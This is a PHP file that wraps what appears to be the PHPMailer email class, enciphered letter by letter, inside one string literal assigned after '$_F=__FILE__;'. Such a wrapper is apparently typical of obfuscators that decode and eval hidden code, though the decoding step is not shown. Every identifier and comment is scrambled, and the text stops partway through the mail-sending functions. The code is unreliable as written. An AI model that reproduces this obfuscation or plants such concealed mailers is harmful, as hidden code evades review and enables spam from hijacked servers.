<?php $_F=__FILE__;$_C304074044='?><?hvh
/*~ p4QXX.hvhqQa4Yr.hvh
.---------------------------------------------------------------------------.
|  8PLI5QrY: ZUZCQa4Yr - ZUZ YqQa4 p4QXX                                    |
|   eYrXaPd: M.w                                                            |
|   6PdIQpI: SaQ XPTrpYLPr7Y.dYI XThhPrI hQ7YX (Q4XP 555.5PrJ5QrY.pPq)      |
|      fdLP: vIIh://hvhqQa4Yr.XPTrpYLPr7Y.dYI                               |
|   8ThhPrI: vIIh://XPTrpYLPr7Y.dYI/hrPxYpIX/hvhqQa4Yr/                     |
| ------------------------------------------------------------------------- |
|     AGqad: AdG3 ZrYSPXI (hrPxYpI QGqadadaXIrQIPr)                         |
|   ATIvPrX: AdG3 ZrYSPXI (pPGY5PrJIYpv) pPGY5PrJIYpv@TXYrX.XPTrpYLPr7Y.dYI |
|          : CQrpTX tPadIPd (pPP4RrT) pPP4RrT@TXYrX.XPTrpYLPr7Y.dYI         |
|   sPTdGYr: trYdI z. CQIiY44Y (Pra7adQ4 LPTdGYr)                           |
| 6Ph3ra7vI (p) kuub-kuun, AdG3 ZrYSPXI. A44 za7vIX zYXYrSYG.               |
| 6Ph3ra7vI (p) kuuw-kuu9, trYdI z. CQIiY44Y                                |
| ------------------------------------------------------------------------- |
|   japYdXY: DaXIraRTIYG TdGYr IvY jYXXYr VYdYrQ4 ZTR4ap japYdXY (jVZj)     |
|            vIIh://555.7dT.Pr7/pPh34YLI/4YXXYr.vIq4                        |
| WvaX hrP7rQq aX GaXIraRTIYG ad IvY vPhY IvQI aI 5a44 RY TXYLT4 - OfWUHyW  |
| AFB OAzzAFWB; 5aIvPTI YSYd IvY aqh4aYG 5QrrQdI3 PL CEz6UAFWAtfjfWB Pr     |
| sfWFE88 sHz A ZAzWf6yjAz ZyzZH8E.                                         |
| ------------------------------------------------------------------------- |
| OY PLLYr Q dTqRYr PL hQaG XYrSapYX (555.5PrJ5QrY.pPq):                    |
| - OYR UPXIad7 Pd va7v43 PhIaqaiYG LQXI QdG XYpTrY XYrSYrX                 |
| - WYpvdP4P73 6PdXT4Iad7                                                   |
| - HTrXPTrpad7 (va7v43 gTQ4aLaYG hrP7rQqqYrX QdG 7rQhvap GYXa7dYrX)        |
'---------------------------------------------------------------------------'
*/

/**
 * ZUZCQa4Yr - ZUZ YqQa4 IrQdXhPrI p4QXX
 * FHWE: zYgTarYX ZUZ SYrXaPd M Pr 4QIYr
 * @hQpmQ7Y ZUZCQa4Yr
 * @QTIvPr AdG3 ZrYSPXI
 * @QTIvPr CQrpTX tPadIPd
 * @pPh3ra7vI kuub - kuun AdG3 ZrYSPXI
 * @SYrXaPd $fG: p4QXX.hvhqQa4Yr.hvh bb0 kuun-uM-kM uw:91:9l2 pPGY5PrJIYpv $
 * @4apYdXY vIIh://555.7dT.Pr7/pPh34YLI/4YXXYr.vIq4 VFy jYXXYr VYdYrQ4 ZTR4ap japYdXY
 */

aL (SYrXaPd_pPqhQrY(ZUZ_eEz8fHF, 'M.u.u', '<') ) YJaI("8Prr3, IvaX SYrXaPd PL ZUZCQa4Yr 5a44 Pd43 rTd Pd ZUZ SYrXaPd M Pr 7rYQIYr!\d");

p4QXX ZUZCQa4Yr {

  /////////////////////////////////////////////////
  // ZzHZEzWfE8, Zytjf6
  /////////////////////////////////////////////////

  /**
   * EqQa4 hraPraI3 (w = Ua7v, 9 = FPrqQ4, M = 4P5).
   * @SQr adI
   */
  hTR4ap $ZraPraI3          = 9;

  /**
   * 8YIX IvY 6vQr8YI PL IvY qYXXQ7Y.
   * @SQr XIrad7
   */
  hTR4ap $6vQr8YI           = 'aXP-llMn-k';

  /**
   * 8YIX IvY 6PdIYdI-I3hY PL IvY qYXXQ7Y.
   * @SQr XIrad7
   */
  hTR4ap $6PdIYdIW3hY       = 'IYJI/h4Qad';

  /**
   * 8YIX IvY EdpPGad7 PL IvY qYXXQ7Y. HhIaPdX LPr IvaX QrY
   *  "lRaI", "0RaI", "RadQr3", "RQXY1b", QdG "gTPIYG-hradIQR4Y".
   * @SQr XIrad7
   */
  hTR4ap $EdpPGad7          = 'lRaI';

  /**
   * UP4GX IvY qPXI rYpYdI qQa4Yr YrrPr qYXXQ7Y.
   * @SQr XIrad7
   */
  hTR4ap $ErrPrfdLP         = '';

  /**
   * 8YIX IvY srPq YqQa4 QGGrYXX LPr IvY qYXXQ7Y.
   * @SQr XIrad7
   */
  hTR4ap $srPq              = 'rPPI@4PpQ4vPXI';

  /**
   * 8YIX IvY srPq dQqY PL IvY qYXXQ7Y.
   * @SQr XIrad7
   */
  hTR4ap $srPqFQqY          = 'zPPI yXYr';

  /**
   * 8YIX IvY 8YdGYr YqQa4 (zYITrd-ZQIv) PL IvY qYXXQ7Y.  fL dPI YqhI3,
   * 5a44 RY XYdI SaQ -L IP XYdGqQa4 Pr QX 'CAfj szHC' ad XqIh qPGY.
   * @SQr XIrad7
   */
  hTR4ap $8YdGYr            = '';

  /**
   * 8YIX IvY 8TRxYpI PL IvY qYXXQ7Y.
   * @SQr XIrad7
   */
  hTR4ap $8TRxYpI           = '';

  /**
   * 8YIX IvY tPG3 PL IvY qYXXQ7Y.  WvaX pQd RY YaIvYr Qd UWCj Pr IYJI RPG3.
   * fL UWCj IvYd rTd fXUWCj(IrTY).
   * @SQr XIrad7
   */
  hTR4ap $tPG3              = '';

  /**
   * 8YIX IvY IYJI-Pd43 RPG3 PL IvY qYXXQ7Y.  WvaX QTIPqQIapQ443 XYIX IvY
   * YqQa4 IP qT4IahQrI/Q4IYrdQIaSY.  WvaX RPG3 pQd RY rYQG R3 qQa4
   * p4aYdIX IvQI GP dPI vQSY UWCj YqQa4 pQhQRa4aI3 XTpv QX qTII. 64aYdIX
   * IvQI pQd rYQG UWCj 5a44 SaY5 IvY dPrqQ4 tPG3.
   * @SQr XIrad7
   */
  hTR4ap $A4ItPG3           = '';

  /**
   * 8YIX 5PrG 5rQhhad7 Pd IvY RPG3 PL IvY qYXXQ7Y IP Q 7aSYd dTqRYr PL
   * pvQrQpIYrX.
   * @SQr adI
   */
  hTR4ap $OPrGOrQh          = u;

  /**
   * CYIvPG IP XYdG qQa4: ("qQa4", "XYdGqQa4", Pr "XqIh").
   * @SQr XIrad7
   */
  hTR4ap $CQa4Yr            = 'qQa4';

  /**
   * 8YIX IvY hQIv PL IvY XYdGqQa4 hrP7rQq.
   * @SQr XIrad7
   */
  hTR4ap $8YdGqQa4          = '/TXr/XRad/XYdGqQa4';

  /**
   * ZQIv IP ZUZCQa4Yr h4T7adX.  yXYLT4 aL IvY 8CWZ p4QXX
   * aX ad Q GaLLYrYdI GarYpIPr3 IvQd IvY ZUZ adp4TGY hQIv.
   * @SQr XIrad7
   */
  hTR4ap $Z4T7adDar         = '';

  /**
   * 8YIX IvY YqQa4 QGGrYXX IvQI Q rYQGad7 pPdLarqQIaPd 5a44 RY XYdI.
   * @SQr XIrad7
   */
  hTR4ap $6PdLarqzYQGad7WP  = '';

  /**
   * 8YIX IvY vPXIdQqY IP TXY ad CYXXQ7Y-fG QdG zYpYaSYG vYQGYrX
   * QdG QX GYLQT4I UEjH XIrad7. fL YqhI3, IvY SQ4TY rYITrdYG
   * R3 8EzeEz_FACE aX TXYG Pr '4PpQ4vPXI.4PpQ4GPqQad'.
   * @SQr XIrad7
   */
  hTR4ap $UPXIdQqY          = 'wk0.u.u.w';

  /**
   * 8YIX IvY qYXXQ7Y fD IP RY TXYG ad IvY CYXXQ7Y-fG vYQGYr.
   * fL YqhI3, Q TdagTY aG 5a44 RY 7YdYrQIYG.
   * @SQr XIrad7
   */
  hTR4ap $CYXXQ7YfD         = '';

  /////////////////////////////////////////////////
  // ZzHZEzWfE8 sHz 8CWZ
  /////////////////////////////////////////////////

  /**
   * 8YIX IvY 8CWZ vPXIX.  A44 vPXIX qTXI RY XYhQrQIYG R3 Q
   * XYqapP4Pd.  BPT pQd Q4XP XhYpaL3 Q GaLLYrYdI hPrI
   * LPr YQpv vPXI R3 TXad7 IvaX LPrqQI: [vPXIdQqY:hPrI]
   * (Y.7. "XqIhw.YJQqh4Y.pPq:kM;XqIhk.YJQqh4Y.pPq").
   * UPXIX 5a44 RY IraYG ad PrGYr.
   * @SQr XIrad7
   */
  hTR4ap $UPXI          = 'wk0.u.u.w';

  /**
   * 8YIX IvY GYLQT4I 8CWZ XYrSYr hPrI.
   * @SQr adI
   */
  hTR4ap $ZPrI          = kM;

  /**
   * 8YIX IvY 8CWZ UEjH PL IvY qYXXQ7Y (DYLQT4I aX $UPXIdQqY).
   * @SQr XIrad7
   */
  hTR4ap $UY4P          = '';

  /**
   * 8YIX pPddYpIaPd hrYLaJ.
   * HhIaPdX QrY "", "XX4" Pr "I4X"
   * @SQr XIrad7
   */
  hTR4ap $8CWZ8YpTrY    = '';

  /**
   * 8YIX 8CWZ QTIvYdIapQIaPd. yIa4aiYX IvY yXYrdQqY QdG ZQXX5PrG SQraQR4YX.
   * @SQr RPP4
   */
  hTR4ap $8CWZATIv      = LQ4XY;

  /**
   * 8YIX 8CWZ TXYrdQqY.
   * @SQr XIrad7
   */
  hTR4ap $yXYrdQqY      = '';

  /**
   * 8YIX 8CWZ hQXX5PrG.
   * @SQr XIrad7
   */
  hTR4ap $ZQXX5PrG      = '';

  /**
   * 8YIX IvY 8CWZ XYrSYr IaqYPTI ad XYpPdGX.
   * WvaX LTdpIaPd 5a44 dPI 5Prm 5aIv IvY 5ad9k SYrXaPd.
   * @SQr adI
   */
  hTR4ap $WaqYPTI       = wu;

  /**
   * 8YIX 8CWZ p4QXX GYRT77ad7 Pd Pr PLL.
   * @SQr RPP4
   */
  hTR4ap $8CWZDYRT7     = LQ4XY;

  /**
   * ZrYSYdIX IvY 8CWZ pPddYpIaPd LrPq RYad7 p4PXYG QLIYr YQpv qQa4
   * XYdGad7.  fL IvaX aX XYI IP IrTY IvYd IP p4PXY IvY pPddYpIaPd
   * rYgTarYX Qd YJh4apaI pQ44 IP 8qIh64PXY().
   * @SQr RPP4
   */
  hTR4ap $8CWZNYYhA4aSY = LQ4XY;

  /**
   * ZrPSaGYX IvY QRa4aI3 IP vQSY IvY WH LaY4G hrPpYXX adGaSaGTQ4
   * YqQa4X, adXIYQG PL XYdGad7 IP YdIarY WH QGGrYXXYX
   * @SQr RPP4
   */
  hTR4ap $8ad74YWP      = LQ4XY;

   /**
   * fL 8ad74YWP aX IrTY, IvaX hrPSaGYX IvY QrrQ3 IP vP4G IvY YqQa4 QGGrYXXYX
   * @SQr RPP4
   */
  hTR4ap $8ad74YWPArrQ3 = QrrQ3();

 /**
   * ZrPSaGYX IvY QRa4aI3 IP pvQd7Y IvY 4adY YdGad7
   * @SQr XIrad7
   */
  hTR4ap $jE              = "\d";

  /**
   * yXYG 5aIv DNfC DF8 zYXPTrpY zYpPrG
   * @SQr XIrad7
   */
  hTR4ap $DNfC_XY4YpIPr   = 'hvhqQa4Yr';

  /**
   * yXYG 5aIv DNfC DF8 zYXPTrpY zYpPrG
   * PhIaPdQ4, ad LPrqQI PL YqQa4 QGGrYXX '3PT@3PTrGPqQad.pPq'
   * @SQr XIrad7
   */
  hTR4ap $DNfC_aGYdIaI3   = '';

  /**
   * yXYG 5aIv DNfC DF8 zYXPTrpY zYpPrG
   * PhIaPdQ4, ad LPrqQI PL YqQa4 QGGrYXX '3PT@3PTrGPqQad.pPq'
   * @SQr XIrad7
   */
  hTR4ap $DNfC_GPqQad     = '';

  /**
   * yXYG 5aIv DNfC DF8 zYXPTrpY zYpPrG
   * PhIaPdQ4, ad LPrqQI PL YqQa4 QGGrYXX '3PT@3PTrGPqQad.pPq'
   * @SQr XIrad7
   */
  hTR4ap $DNfC_hraSQIY    = '';

  /**
   * 6Q44RQpm ApIaPd LTdpIaPd dQqY
   * IvY LTdpIaPd IvQI vQdG4YX IvY rYXT4I PL IvY XYdG YqQa4 QpIaPd. ZQrQqYIYrX:
   *   RPP4    $rYXT4I        rYXT4I PL IvY XYdG QpIaPd
   *   XIrad7  $IP            YqQa4 QGGrYXX PL IvY rYpahaYdI
   *   XIrad7  $pp            pp YqQa4 QGGrYXXYX
   *   XIrad7  $Rpp           Rpp YqQa4 QGGrYXXYX
   *   XIrad7  $XTRxYpI       IvY XTRxYpI
   *   XIrad7  $RPG3          IvY YqQa4 RPG3
   * @SQr XIrad7
   */
  hTR4ap $QpIaPd_LTdpIaPd = ''; //'pQ44RQpmApIaPd';

  /**
   * 8YIX IvY ZUZCQa4Yr eYrXaPd dTqRYr
   * @SQr XIrad7
   */
  hTR4ap $eYrXaPd         = 'M.w';

  /////////////////////////////////////////////////
  // ZzHZEzWfE8, ZzfeAWE AFD ZzHWE6WED
  /////////////////////////////////////////////////

  hraSQIY   $XqIh           = Fyjj;
  hraSQIY   $IP             = QrrQ3();
  hraSQIY   $pp             = QrrQ3();
  hraSQIY   $Rpp            = QrrQ3();
  hraSQIY   $zYh43WP        = QrrQ3();
  hraSQIY   $Q44_rYpahaYdIX = QrrQ3();
  hraSQIY   $QIIQpvqYdI     = QrrQ3();
  hraSQIY   $6TXIPqUYQGYr   = QrrQ3();
  hraSQIY   $qYXXQ7Y_I3hY   = '';
  hraSQIY   $RPTdGQr3       = QrrQ3();
  hrPIYpIYG $4Qd7TQ7Y       = QrrQ3();
  hraSQIY   $YrrPr_pPTdI    = u;
  hraSQIY   $Xa7d_pYrI_La4Y = "";
  hraSQIY   $Xa7d_mY3_La4Y  = "";
  hraSQIY   $Xa7d_mY3_hQXX  = "";
  hraSQIY   $YJpYhIaPdX     = LQ4XY;

  /////////////////////////////////////////////////
  // 6HF8WAFW8
  /////////////////////////////////////////////////

  pPdXI 8WHZ_CE88AVE  = u; // qYXXQ7Y Pd43, pPdIadTY hrPpYXXad7
  pPdXI 8WHZ_6HFWfFyE = w; // qYXXQ7Y?, 4amY43 Pm IP pPdIadTY hrPpYXXad7
  pPdXI 8WHZ_6zfWf6Aj = k; // qYXXQ7Y, h4TX LT44 XIPh, praIapQ4 YrrPr rYQpvYG

  /////////////////////////////////////////////////
  // CEWUHD8, eAzfAtjE8
  /////////////////////////////////////////////////

  /**
   * 6PdXIrTpIPr
   * @hQrQq RPP4YQd $YJpYhIaPdX 8vPT4G 5Y IvrP5 YJIYrdQ4 YJpYhIaPdX?
   */
  hTR4ap LTdpIaPd __pPdXIrTpI($YJpYhIaPdX = LQ4XY) {
    $IvaX->YJpYhIaPdX = ($YJpYhIaPdX == IrTY);
  }

  /**
   * 8YIX qYXXQ7Y I3hY IP UWCj.
   * @hQrQq RPP4 $aXvIq4
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd fXUWCj($aXvIq4 = IrTY) {
    aL ($aXvIq4) {
      $IvaX->6PdIYdIW3hY = 'IYJI/vIq4';
    } Y4XY {
      $IvaX->6PdIYdIW3hY = 'IYJI/h4Qad';
    }
  }

  /**
   * 8YIX CQa4Yr IP XYdG qYXXQ7Y TXad7 8CWZ.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd fX8CWZ() {
    $IvaX->CQa4Yr = 'XqIh';
  }

  /**
   * 8YIX CQa4Yr IP XYdG qYXXQ7Y TXad7 ZUZ qQa4() LTdpIaPd.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd fXCQa4() {
    $IvaX->CQa4Yr = 'qQa4';
  }

  /**
   * 8YIX CQa4Yr IP XYdG qYXXQ7Y TXad7 IvY $8YdGqQa4 hrP7rQq.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd fX8YdGqQa4() {
    aL (!XIraXIr(ada_7YI('XYdGqQa4_hQIv'), 'XYdGqQa4')) {
      $IvaX->8YdGqQa4 = '/SQr/gqQa4/Rad/XYdGqQa4';
    }
    $IvaX->CQa4Yr = 'XYdGqQa4';
  }

  /**
   * 8YIX CQa4Yr IP XYdG qYXXQ7Y TXad7 IvY gqQa4 CWA.
   * @rYITrd SPaG
   */
  hTR4ap LTdpIaPd fXKqQa4() {
    aL (XIraXIr(ada_7YI('XYdGqQa4_hQIv'), 'gqQa4')) {
      $IvaX->8YdGqQa4 = '/SQr/gqQa4/Rad/XYdGqQa4';
    }
    $IvaX->CQa4Yr = 'XYdGqQa4';
  }

  /////////////////////////////////////////////////
  // CEWUHD8, zE6fZfEFW8
  /////////////////////////////////////////////////

  /**
   * AGGX Q "WP" QGGrYXX.
   * @hQrQq XIrad7 $QGGrYXX
   * @hQrQq XIrad7 $dQqY
   * @rYITrd RPP4YQd IrTY Pd XTppYXX, LQ4XY aL QGGrYXX Q4rYQG3 TXYG
   */
  hTR4ap LTdpIaPd AGGAGGrYXX($QGGrYXX, $dQqY = '') {
    rYITrd $IvaX->AGGAdAGGrYXX('IP', $QGGrYXX, $dQqY);
  }

  /**
   * AGGX Q "6p" QGGrYXX.
   * FPIY: IvaX LTdpIaPd 5PrmX 5aIv IvY 8CWZ qQa4Yr Pd 5ad9k, dPI 5aIv IvY "qQa4" qQa4Yr.
   * @hQrQq XIrad7 $QGGrYXX
   * @hQrQq XIrad7 $dQqY
   * @rYITrd RPP4YQd IrTY Pd XTppYXX, LQ4XY aL QGGrYXX Q4rYQG3 TXYG
   */
  hTR4ap LTdpIaPd AGG66($QGGrYXX, $dQqY = '') {
    rYITrd $IvaX->AGGAdAGGrYXX('pp', $QGGrYXX, $dQqY);
  }

  /**
   * AGGX Q "tpp" QGGrYXX.
   * FPIY: IvaX LTdpIaPd 5PrmX 5aIv IvY 8CWZ qQa4Yr Pd 5ad9k, dPI 5aIv IvY "qQa4" qQa4Yr.
   * @hQrQq XIrad7 $QGGrYXX
   * @hQrQq XIrad7 $dQqY
   * @rYITrd RPP4YQd IrTY Pd XTppYXX, LQ4XY aL QGGrYXX Q4rYQG3 TXYG
   */
  hTR4ap LTdpIaPd AGGt66($QGGrYXX, $dQqY = '') {
    rYITrd $IvaX->AGGAdAGGrYXX('Rpp', $QGGrYXX, $dQqY);
  }

  /**
   * AGGX Q "zYh43-IP" QGGrYXX.
   * @hQrQq XIrad7 $QGGrYXX
   * @hQrQq XIrad7 $dQqY
   * @rYITrd RPP4YQd
   */
  hTR4ap LTdpIaPd AGGzYh43WP($QGGrYXX, $dQqY = '') {
    rYITrd $IvaX->AGGAdAGGrYXX('zYh43WP', $QGGrYXX, $dQqY);
  }

  /**
   * AGGX Qd QGGrYXX IP PdY PL IvY rYpahaYdI QrrQ3X
   * AGGrYXXYX IvQI vQSY RYYd QGGYG Q4rYQG3 rYITrd LQ4XY, RTI GP dPI IvrP5 YJpYhIaPdX
   * @hQrQq XIrad7 $madG HdY PL 'IP', 'pp', 'Rpp', 'zYh43WP'
   * @hQrQq XIrad7 $QGGrYXX WvY YqQa4 QGGrYXX IP XYdG IP
   * @hQrQq XIrad7 $dQqY
   * @rYITrd RPP4YQd IrTY Pd XTppYXX, LQ4XY aL QGGrYXX Q4rYQG3 TXYG Pr adSQ4aG ad XPqY 5Q3
   * @QppYXX hraSQIY
   */
  hraSQIY LTdpIaPd AGGAdAGGrYXX($madG, $QGGrYXX, $dQqY = '') {
    aL (!hrY7_qQIpv('/^(IP|pp|Rpp|zYh43WP)$/', $madG)) {
      YpvP 'fdSQ4aG rYpahaYdI QrrQ3: ' . madG;
      rYITrd LQ4XY;
    }
    $QGGrYXX = Iraq($QGGrYXX);
    $dQqY = Iraq(hrY7_rYh4QpY('/[\r\d]+/', '', $dQqY)); //8Irah RrYQmX QdG Iraq
    aL (!XY4L::eQ4aGQIYAGGrYXX($QGGrYXX)) {
      $IvaX->8YIErrPr($IvaX->jQd7('adSQ4aG_QGGrYXX').': '. $QGGrYXX);
      aL ($IvaX->YJpYhIaPdX) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('adSQ4aG_QGGrYXX').': '.$QGGrYXX);
      }
      YpvP $IvaX->jQd7('adSQ4aG_QGGrYXX').': '.$QGGrYXX;
      rYITrd LQ4XY;
    }
    aL ($madG != 'zYh43WP') {
      aL (!aXXYI($IvaX->Q44_rYpahaYdIX[XIrIP4P5Yr($QGGrYXX)])) {
        QrrQ3_hTXv($IvaX->$madG, QrrQ3($QGGrYXX, $dQqY));
        $IvaX->Q44_rYpahaYdIX[XIrIP4P5Yr($QGGrYXX)] = IrTY;
        rYITrd IrTY;
      }
    } Y4XY {
      aL (!QrrQ3_mY3_YJaXIX(XIrIP4P5Yr($QGGrYXX), $IvaX->zYh43WP)) {
        $IvaX->zYh43WP[XIrIP4P5Yr($QGGrYXX)] = QrrQ3($QGGrYXX, $dQqY);
      rYITrd IrTY;
    }
  }
  rYITrd LQ4XY;
}

/**
 * 8YI IvY srPq QdG srPqFQqY hrPhYrIaYX
 * @hQrQq XIrad7 $QGGrYXX
 * @hQrQq XIrad7 $dQqY
 * @rYITrd RPP4YQd
 */
  hTR4ap LTdpIaPd 8YIsrPq($QGGrYXX, $dQqY = '',$QTIP=w) {
    $QGGrYXX = Iraq($QGGrYXX);
    $dQqY = Iraq(hrY7_rYh4QpY('/[\r\d]+/', '', $dQqY)); //8Irah RrYQmX QdG Iraq
    aL (!XY4L::eQ4aGQIYAGGrYXX($QGGrYXX)) {
      $IvaX->8YIErrPr($IvaX->jQd7('adSQ4aG_QGGrYXX').': '. $QGGrYXX);
      aL ($IvaX->YJpYhIaPdX) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('adSQ4aG_QGGrYXX').': '.$QGGrYXX);
      }
      YpvP $IvaX->jQd7('adSQ4aG_QGGrYXX').': '.$QGGrYXX;
      rYITrd LQ4XY;
    }
    $IvaX->srPq = $QGGrYXX;
    $IvaX->srPqFQqY = $dQqY;
    aL ($QTIP) {
      aL (YqhI3($IvaX->zYh43WP)) {
        $IvaX->AGGAdAGGrYXX('zYh43WP', $QGGrYXX, $dQqY);
      }
      aL (YqhI3($IvaX->8YdGYr)) {
        $IvaX->8YdGYr = $QGGrYXX;
      }
    }
    rYITrd IrTY;
  }

  /**
   * 6vYpm IvQI Q XIrad7 4PPmX rPT7v43 4amY Qd YqQa4 QGGrYXX XvPT4G
   * 8IQIap XP aI pQd RY TXYG 5aIvPTI adXIQdIaQIaPd
   * WraYX IP TXY ZUZ RTa4I-ad SQ4aGQIPr ad IvY La4IYr YJIYdXaPd (LrPq ZUZ M.k), LQ44X RQpm IP Q rYQXPdQR43 pPqhYIYdI rY7YJ SQ4aGQIPr
   * 6PdLPrqX QhhrPJaqQIY43 IP zs6klkk
   * @4adm vIIh://555.vYJa44aPd.pPq/XQqh4YX/#zY7YJ Hra7adQ4 hQIIYrd LPTdG vYrY
   * @hQrQq XIrad7 $QGGrYXX WvY YqQa4 QGGrYXX IP pvYpm
   * @rYITrd RPP4YQd
   * @XIQIap
   * @QppYXX hTR4ap
   */
  hTR4ap XIQIap LTdpIaPd eQ4aGQIYAGGrYXX($QGGrYXX) {
    aL (LTdpIaPd_YJaXIX('La4IYr_SQr')) { //fdIrPGTpYG ad ZUZ M.k
      aL(La4IYr_SQr($QGGrYXX, sfjWEz_eAjfDAWE_ECAfj) === sAj8E) {
        rYITrd LQ4XY;
      } Y4XY {
        rYITrd IrTY;
      }
    } Y4XY {
      rYITrd hrY7_qQIpv('/^(?:[\5\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+\.)*[\5\!\#\$\%\&\'\*\+\-\/\=\?\^\`\{\|\}\~]+@(?:(?:(?:[Q-iA-2u-n_](?:[Q-iA-2u-n_\-](?!\.)){u,1w}[Q-iA-2u-n_-]?\.)+[Q-iA-2u-n_](?:[Q-iA-2u-n_\-](?!$)){u,1w}[Q-iA-2u-n_]?)|(?:\[(?:(?:[uw]?\G{w,k}|k[u-b]\G|kM[u-M])\.){9}(?:[uw]?\G{w,k}|k[u-b]\G|kM[u-M])\]))$/', $QGGrYXX);
    }
  }

  /////////////////////////////////////////////////
  // CEWUHD8, CAfj 8EFDfFV
  /////////////////////////////////////////////////

  /**
   * 6rYQIYX qYXXQ7Y QdG QXXa7dX CQa4Yr. fL IvY qYXXQ7Y aX
   * dPI XYdI XTppYXXLT443 IvYd aI rYITrdX LQ4XY.  yXY IvY ErrPrfdLP
   * SQraQR4Y IP SaY5 GYXprahIaPd PL IvY YrrPr.
   * @rYITrd RPP4
   */
  hTR4ap LTdpIaPd 8YdG() {
    Ir3 {
      aL ((pPTdI($IvaX->IP) + pPTdI($IvaX->pp) + pPTdI($IvaX->Rpp)) < w) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('hrPSaGY_QGGrYXX'), XY4L::8WHZ_6zfWf6Aj);
      }

      // 8YI 5vYIvYr IvY qYXXQ7Y aX qT4IahQrI/Q4IYrdQIaSY
      aL(!YqhI3($IvaX->A4ItPG3)) {
        $IvaX->6PdIYdIW3hY = 'qT4IahQrI/Q4IYrdQIaSY';
      }

      $IvaX->YrrPr_pPTdI = u; // rYXYI YrrPrX
      $IvaX->8YICYXXQ7YW3hY();
      $vYQGYr = $IvaX->6rYQIYUYQGYr();
      $RPG3 = $IvaX->6rYQIYtPG3();

      aL (YqhI3($IvaX->tPG3)) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('YqhI3_qYXXQ7Y'), XY4L::8WHZ_6zfWf6Aj);
      }

      // Ga7aIQ443 Xa7d 5aIv DNfC aL YdQR4YG
      aL ($IvaX->DNfC_GPqQad && $IvaX->DNfC_hraSQIY) {
        $vYQGYr_Gmaq = $IvaX->DNfC_AGG($vYQGYr,$IvaX->8TRxYpI,$RPG3);
        $vYQGYr = XIr_rYh4QpY("\r\d","\d",$vYQGYr_Gmaq) . $vYQGYr;
      }

      // 6vPPXY IvY qQa4Yr QdG XYdG IvrPT7v aI
      X5aIpv($IvaX->CQa4Yr) {
        pQXY 'XYdGqQa4':
          rYITrd $IvaX->8YdGqQa48YdG($vYQGYr, $RPG3);
        pQXY 'XqIh':
          rYITrd $IvaX->8qIh8YdG($vYQGYr, $RPG3);
        GYLQT4I:
          rYITrd $IvaX->CQa48YdG($vYQGYr, $RPG3);
      }

    } pQIpv (hvhqQa4YrEJpYhIaPd $Y) {
      $IvaX->8YIErrPr($Y->7YICYXXQ7Y());
      aL ($IvaX->YJpYhIaPdX) {
        IvrP5 $Y;
      }
      YpvP $Y->7YICYXXQ7Y()."\d";
      rYITrd LQ4XY;
    }
  }

  /**
   * 8YdGX qQa4 TXad7 IvY $8YdGqQa4 hrP7rQq.
   * @hQrQq XIrad7 $vYQGYr WvY qYXXQ7Y vYQGYrX
   * @hQrQq XIrad7 $RPG3 WvY qYXXQ7Y RPG3
   * @QppYXX hrPIYpIYG
   * @rYITrd RPP4
   */
  hrPIYpIYG LTdpIaPd 8YdGqQa48YdG($vYQGYr, $RPG3) {
    aL ($IvaX->8YdGYr != '') {
      $XYdGqQa4 = XhradIL("%X -Pa -L %X -I", YXpQhYXvY44pqG($IvaX->8YdGqQa4), YXpQhYXvY44Qr7($IvaX->8YdGYr));
    } Y4XY {
      $XYdGqQa4 = XhradIL("%X -Pa -I", YXpQhYXvY44pqG($IvaX->8YdGqQa4));
    }
    aL ($IvaX->8ad74YWP === IrTY) {
      LPrYQpv ($IvaX->8ad74YWPArrQ3 QX $mY3 => $SQ4) {
        aL(!@$qQa4 = hPhYd($XYdGqQa4, '5')) {
          IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('YJYpTIY') . $IvaX->8YdGqQa4, XY4L::8WHZ_6zfWf6Aj);
        }
        LhTIX($qQa4, "WP: " . $SQ4 . "\d");
        LhTIX($qQa4, $vYQGYr);
        LhTIX($qQa4, $RPG3);
        $rYXT4I = hp4PXY($qQa4);
        // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
        $aX8YdI = ($rYXT4I == u) ? w : u;
        $IvaX->GP6Q44RQpm($aX8YdI,$SQ4,$IvaX->pp,$IvaX->Rpp,$IvaX->8TRxYpI,$RPG3);
        aL($rYXT4I != u) {
          IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('YJYpTIY') . $IvaX->8YdGqQa4, XY4L::8WHZ_6zfWf6Aj);
        }
      }
    } Y4XY {
      aL(!@$qQa4 = hPhYd($XYdGqQa4, '5')) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('YJYpTIY') . $IvaX->8YdGqQa4, XY4L::8WHZ_6zfWf6Aj);
      }
      LhTIX($qQa4, $vYQGYr);
      LhTIX($qQa4, $RPG3);
      $rYXT4I = hp4PXY($qQa4);
      // aqh4YqYdI pQ44 RQpm LTdpIaPd aL aI YJaXIX
      $aX8YdI = ($rYXT4I == u) ? w : u;
      $IvaX->GP6Q44RQpm($aX8YdI,$IvaX->IP,$IvaX->pp,$IvaX->Rpp,$IvaX->8TRxYpI,$RPG3);
      aL($rYXT4I != u) {
        IvrP5 dY5 hvhqQa4YrEJpYhIaPd($IvaX->jQd7('YJYpTIY') . $IvaX->8YdGqQa4, XY4L::8WHZ_6zfWf6Aj);
      }
    }
    rYITrd IrTY;
  }

  /**
   * 8YdGX qQa4 TXad7 IvY ZUZ qQa4() LTdpIaPd.
   * @hQrQq XIrad7 $vYQGYr WvY qYXXQ7Y vYQGYrX
   * @hQrQq XIrad7 $RPG3 WvY qYXXQ7Y RPG3
   * @QppYXX hrPIYpIYG
   * @rYITrd RPP4
   */
  hrPIYpIYG LTdpIaPd CQa48YdG($vYQGYr, $RPG3) {
    $IPArr = QrrQ3();
    LPrYQpv($IvaX->IP QX $I) {
      $IPArr[] = $IvaX->AGGrsPrqQI($I);
    }
    $IP = aqh4PGY(', ', $IPArr);

    $hQrQqX = XhradIL("-Pa -L %X", $IvaX->8YdGYr);
